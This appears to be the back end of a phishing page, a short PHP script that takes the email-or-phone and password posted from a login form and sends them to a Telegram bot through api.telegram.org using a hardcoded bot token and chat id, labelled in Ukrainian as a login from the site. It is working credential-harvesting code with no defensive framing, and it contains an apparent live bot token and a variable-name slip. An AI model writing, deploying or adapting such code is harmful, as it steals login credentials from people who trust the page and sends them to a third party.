<?php
if($_POST) {
    try{
        $emaorpho = $_POST["emaorpho"];
        $password = $_POST["passwords"];
    }catch(\Throwable $th) {
        $emaorpho = "Error in massege";
        $password = "Error in massege";
    }
        $token = "8842868099:AAHmCFsEVBLwH-Js-Gf7TrcFLs3P4rdpdsQ";
        $chat_id = 5368288287;
        $textMessage = "Вхід з сайту. \n email or phone:" . $emorph . " \n pasword:" . $password;
        $textMessage = urlencode ("$textMessage");
        $urlQuery = "https://api.telegram.org/bot". $token ."/sendMessage?chat_id=". $chat_id. "&text=" . $textMessage;
        $urlQuery .= "&parse_mode=HTML";
        $result = file_get_contents ($urlQuery);
}
?>